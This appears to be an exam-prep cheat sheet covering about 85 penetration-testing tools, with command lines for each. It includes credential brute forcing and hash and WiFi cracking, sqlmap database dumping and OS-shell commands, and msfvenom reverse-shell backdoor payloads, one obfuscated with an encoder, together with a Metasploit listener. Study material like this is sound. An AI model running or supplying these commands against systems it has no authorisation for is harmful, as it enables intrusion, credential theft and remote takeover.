---
layout: default
title: Complete Tools Reference
parent: Tools Reference
nav_order: 1
---

# Complete Tools Reference (85+ Tools)

**Use Ctrl+F to search for specific tools during exam.**

---

## Scanning & Enumeration Tools

### NMAP - Network Mapper
```bash
nmap -sn 192.168.1.0/24                    # Ping scan
nmap -sS -v 192.168.1.5                    # SYN scan
nmap -sT 192.168.1.5                       # Connect scan
nmap -sU 192.168.1.5                       # UDP scan
nmap -A -T4 -p- 192.168.1.5               # Comprehensive
nmap -sV 192.168.1.5                       # Version detection
nmap --script smb-os-discovery.nse -p445   # SMB OS
nmap --script smb-enum-users.nse -p445     # SMB users
nmap --script smb-enum-shares.nse -p445    # SMB shares
```

### Enum4linux - SMB Enumeration
```bash
enum4linux -a 192.168.1.5                  # All info
enum4linux -U 192.168.1.5                  # Users
enum4linux -S 192.168.1.5                  # Shares
enum4linux -G 192.168.1.5                  # Groups
enum4linux -P 192.168.1.5                  # Password policy
enum4linux -u admin -p pass -a 192.168.1.5 # With credentials
```

### SMBClient - SMB Access
```bash
smbclient -L 192.168.1.5                   # List shares
smbclient //192.168.1.5/Documents          # Access share
smbget -R smb://192.168.1.5/Documents      # Download
```

### Other Scanning Tools
```bash
netdiscover -i eth0 -r 192.168.1.0/24      # Network discovery
snmp-check 192.168.1.5                     # SNMP enumeration
onesixtyone 192.168.1.0/24                 # SNMP discovery
nslookup target.com                        # DNS lookup
dig target.com                             # Detailed DNS
dig @ns1.target.com target.com axfr        # Zone transfer
```

---

## Credential Cracking Tools

### Hydra - Multi-Service Brute Force
```bash
# RDP cracking
hydra -l Administrator -P rockyou.txt rdp://192.168.1.50

# SSH cracking
hydra -l root -P rockyou.txt ssh://192.168.1.5

# FTP cracking
hydra -l admin -P rockyou.txt ftp://192.168.1.5

# HTTP POST
hydra -l admin -P rockyou.txt http-post-form://192.168.1.5:80/login.php:username=^USER^&password=^PASS^

# MySQL
hydra -l root -P rockyou.txt mysql://192.168.1.5:3306

# With username list
hydra -L users.txt -P passwords.txt rdp://192.168.1.5

# Verbose output
hydra -l admin -P pass.txt rdp://target -v

# Stop after first success
hydra -l admin -P pass.txt rdp://target -f
```

### Hashcat - GPU Hash Cracking
```bash
# MD5 (mode 0)
hashcat -m 0 -a 0 hashfile rockyou.txt

# SHA1 (mode 100)
hashcat -m 100 -a 0 hashfile rockyou.txt

# SHA256 (mode 1400)
hashcat -m 1400 -a 0 hashfile rockyou.txt

# NTLM Windows (mode 1000)
hashcat -m 1000 -a 0 hashfile rockyou.txt

# bcrypt (mode 3200)
hashcat -m 3200 -a 0 hashfile rockyou.txt

# Show results
hashcat -m 0 hashfile rockyou.txt --show
```

### John the Ripper - Password Cracking
```bash
# Auto-detect hash type
john hashes.txt --wordlist=rockyou.txt

# Specify format
john --format=md5 hashes.txt --wordlist=rockyou.txt

# Show cracked
john --show hashes.txt

# Incremental mode (brute force)
john --incremental hashes.txt
```

### Aircrack-ng - WiFi Cracking
```bash
# Find networks in capture
aircrack-ng Credmapwifi.cap

# Crack with wordlist
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF Credmapwifi.cap

# Monitor interface
airmon-ng start wlan0

# Capture handshake
airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture wlan0mon
```

### Hash Identification
```bash
hashid hash_value                          # Identify hash type
```

---

## Web Application Testing Tools

### SQLMAP - SQL Injection
```bash
# Basic injection test
sqlmap -u "http://192.168.1.5/page.php?id=1" --dbs

# POST data
sqlmap -u "http://192.168.1.5/login.php" --data "user=admin&pass=test" --dbs

# Enumerate tables
sqlmap -u "http://192.168.1.5/page.php?id=1" -D database_name --tables

# Dump table data
sqlmap -u "http://192.168.1.5/page.php?id=1" -D database_name -T users --dump

# Read files
sqlmap -u "http://192.168.1.5/page.php?id=1" --file-read="/etc/passwd"

# OS shell
sqlmap -u "http://192.168.1.5/page.php?id=1" --os-shell
```

### Nikto - Web Vulnerability Scanner
```bash
nikto -h http://192.168.1.5                # Basic scan
nikto -h 192.168.1.5 -p 8080              # Specific port
nikto -h http://192.168.1.5 -o report.txt # Save report
```

### Robuster - Directory Brute Force
```bash
robuster dir -u http://192.168.1.5 -w /usr/share/wordlists/dirb/common.txt
robuster dir -u http://192.168.1.5 -w wordlist.txt
```

### WPScan - WordPress Scanning
```bash
wpscan --url http://target.com --enumerate u              # Users
wpscan --url http://target.com --enumerate p              # Plugins
wpscan --url http://target.com --enumerate t              # Themes
wpscan --url http://target.com --enumerate all            # All
wpscan --url http://target.com -U admin -P rockyou.txt    # Brute force
```

### Burp Suite - Web Proxy & Testing
```
GUI-based tool for:
- Request interception
- Response modification
- Parameter tampering
- Authentication testing
```

### Curl - HTTP Requests
```bash
curl http://target.com                                    # Basic request
curl -u user:pass http://target.com                       # Basic auth
curl -X POST -d "user=admin&pass=test" http://target.com # POST data
curl -b "session=12345" http://target.com                 # With cookies
curl -H "Authorization: Bearer token" http://target.com   # Custom header
```

---

## Cryptography & Steganography Tools

### Steghide - Steganography Extraction
```bash
steghide extract -sf image.jpg                    # Extract (prompts for passphrase)
steghide extract -sf image.jpg -p ""             # Extract (no passphrase)
steghide extract -sf image.jpg -xf output.txt -p "" # Extract to file
steghide info image.jpg                          # Check if contains data
```

### Stegcracker - Steganography Cracking
```bash
stegcracker image.jpg wordlist.txt               # Crack with wordlist
```

### DIE - Detect It Easy (PE Analysis)
```bash
# GUI application
DIE filename.exe

# Command line
detect-it-easy filename.exe
```

### CFF Explorer - PE Headers Tool
```
GUI-based tool for:
- PE header inspection
- Import/Export tables
- Resource examination
- Hex editing
```

### VeraCrypt - Encrypted Volume
```bash
veracrypt --mount /dev/sdb1 /mnt/encrypted --password=PASSWORD
```

### ExifTool - Metadata Extraction
```bash
exiftool image.jpg                          # Show all metadata
exiftool image.jpg | grep -i version        # Search for version
exiftool -a *.jpg > metadata.txt            # Extract all metadata
```

### Strings - Extract Printable Strings
```bash
strings executable.exe                      # All strings
strings executable.exe | grep -i password   # Search for passwords
strings executable.exe | grep -E "http|ftp" # Search for URLs
```

### Objdump - Binary Analysis
```bash
objdump -h executable.exe                   # Show headers
objdump -x executable.exe | grep -A 20 Import # Show imports
objdump -s -j .rsrc executable.exe          # Show resources
```

---

## Network Analysis Tools

### Wireshark - Packet Capture/Analysis
```
GUI-based packet analysis:

Filters:
- http
- tcp port 80
- ip.src == 192.168.1.5
- ip.dst == 10.0.0.1
- ip.ttl == 128 (Windows)
- mqtt.msgtype == 3 (MQTT publish)
- ftp
- dns

Actions:
- File → Open PCAP
- File → Export Objects → HTTP
- Right-click packet → Follow → TCP Stream
- Statistics → Endpoints (show all IPs)
```

### Tcpdump - Command-Line Capture
```bash
# List interfaces
tcpdump -D

# Capture on interface
tcpdump -i eth0

# Save to file
tcpdump -i eth0 -w capture.pcap

# Specific packets
tcpdump -i eth0 -c 100 -w output.pcap

# TCP traffic
tcpdump -i eth0 tcp

# UDP traffic
tcpdump -i eth0 udp

# Specific IP
tcpdump -i eth0 src 192.168.1.5
tcpdump -i eth0 dst 10.0.0.0/8

# Specific port
tcpdump -i eth0 port 80
tcpdump -i eth0 dst port 443

# ASCII output (passwords!)
tcpdump -i eth0 -A "tcp port 21"

# Hex and ASCII
tcpdump -i eth0 -X "tcp port 80"

# Read PCAP file
tcpdump -r capture.pcap
tcpdump -r capture.pcap -A | grep -i password
```

### Tshark - CLI Wireshark
```bash
# Read PCAP
tshark -r capture.pcapng

# Apply filter
tshark -r capture.pcapng -Y "http.request"

# Extract fields
tshark -r capture.pcapng -T fields -e ip.src -e ip.dst

# HTTP requests
tshark -r capture.pcapng -Y "http.request" -T fields -e http.method -e http.host -e http.request.uri

# FTP credentials
tshark -r capture.pcapng -Y "ftp.request.command == 'USER' or ftp.request.command == 'PASS'" -T fields -e ftp.request.command -e ftp.request.arg

# DNS queries
tshark -r capture.pcapng -Y "dns.qry.name" -T fields -e dns.qry.name

# MQTT topics
tshark -r capture.pcapng -Y "mqtt.msgtype == 3" -T fields -e mqtt.topic -e mqtt.msg

# JSON output
tshark -r capture.pcapng -T json > output.json

# CSV output
tshark -r capture.pcapng -T csv > output.csv

# IP statistics
tshark -r capture.pcapng -q -z ip_hosts,tree

# Statistics
tshark -r capture.pcapng -q -z endpoints,tcp
```

---

## Mobile & IoT Tools

### ADB - Android Debug Bridge
```bash
# List devices
adb devices

# Connect via Wi-Fi
adb tcpip 5555
adb connect 192.168.1.100:5555

# Shell commands
adb shell whoami
adb shell ps
adb shell ls /sdcard/DCIM/Camera/
adb shell getprop ro.build.version.release  # Android version

# File operations
adb pull /sdcard/DCIM/Camera/image.jpg ./  # Pull file
adb push file.apk /sdcard/                 # Push file
adb shell ls -la /data/data/               # List apps

# Root access
adb root
adb shell whoami  # Verify root

# Database access
adb pull /data/data/com.example.app/databases/app.db ./

# Screenshots
adb shell screencap /sdcard/screen.png
adb pull /sdcard/screen.png ./

# Logcat
adb logcat
adb logcat | grep com.example.app
adb logcat *:E  # Errors only
adb logcat -c   # Clear logs

# Input simulation
adb shell input text "password"
adb shell input tap 500 1200
adb shell input swipe 100 500 100 100
adb shell input keyevent 3  # HOME
```

### SQLite3 - Database Analysis
```bash
sqlite3 app.db              # Open database
.tables                     # List tables
.schema users              # Show schema
SELECT * FROM users;       # Query data
.exit                      # Exit
```

### Mosquitto - MQTT Tools
```bash
mosquitto_sub -h broker -t "home/temperature"  # Subscribe
mosquitto_pub -h broker -t "home/command" -m "on"  # Publish
mosquitto_pub -h broker -t "#" -m ""  # Subscribe all
```

---

## Exploitation & Payloads

### Msfvenom - Payload Generation
```bash
# Windows reverse shell (EXE)
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 \
  LPORT=4444 \
  -f exe > backdoor.exe

# Linux reverse shell (ELF)
msfvenom -p linux/x86/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 \
  LPORT=4444 \
  -f elf > linux_shell

# Windows batch file
msfvenom -p windows/cmd/reverse_tcp \
  LHOST=192.168.1.100 \
  LPORT=4444 \
  -f bat > shell.bat

# With encoder (obfuscation)
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 \
  LPORT=4444 \
  -e x86/shikata_ga_nai \
  -i 5 \
  -f exe > obfuscated.exe
```

### Msfconsole - Metasploit Framework
```bash
msfconsole                          # Start console
use exploit/multi/handler           # Handler for reverse shell
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
run                                 # Listen for connections

# Meterpreter session commands:
getuid                              # Current user
sysinfo                             # System info
ps                                  # List processes
download file.txt /tmp/             # Download file
upload /tmp/evil.exe c:\windows\    # Upload file
```

---

## File & System Analysis

### Hashid - Hash Type Identification
```bash
hashid hash_value                   # Identify hash type
hashid -e hash_value                # Extended analysis
```

### Find Command - File Search
```bash
find / -name "*.db" 2>/dev/null     # Find all databases
find / -name "*password*" 2>/dev/null  # Files with "password" in name
find . -type f -newer file.txt      # Files modified after file.txt
find . -type f -size +100M          # Files over 100MB
```

### Grep - Text Search
```bash
grep -r "password" ./               # Search for "password"
grep -i "admin" file.txt            # Case-insensitive
grep -E "(http|ftp|ssh)" file.txt   # Regex pattern
grep -v "^#" config.txt             # Exclude comments
```

---

## Quick Reference by Task

### If You Need to...

| Task | Tool | Command |
|------|------|---------|
| Find live hosts | NMAP | `nmap -sn 192.168.1.0/24` |
| Scan ports | NMAP | `nmap -A -T4 -p- IP` |
| Enumerate SMB | Enum4linux | `enum4linux -a IP` |
| Crack password (CPU) | John | `john hashes.txt --wordlist=rockyou.txt` |
| Crack password (GPU) | Hashcat | `hashcat -m 0 hash rockyou.txt` |
| Test SQL injection | SQLMAP | `sqlmap -u URL --dbs` |
| Scan web app | Nikto | `nikto -h http://IP` |
| Extract steganography | Steghide | `steghide extract -sf image.jpg` |
| Analyze PCAP | Wireshark | Open .pcap file, apply filters |
| Analyze traffic CLI | Tshark | `tshark -r capture.pcapng` |
| Capture packets | Tcpdump | `tcpdump -i eth0 -w output.pcap` |
| Access Android | ADB | `adb connect IP:5555` |
| Analyze PE file | DIE | Open executable in GUI |
| Crack WiFi | Aircrack-ng | `aircrack-ng -w wordlist.txt capture.cap` |

---

**Remember:** Use Ctrl+F to search for the tool you need during the exam!
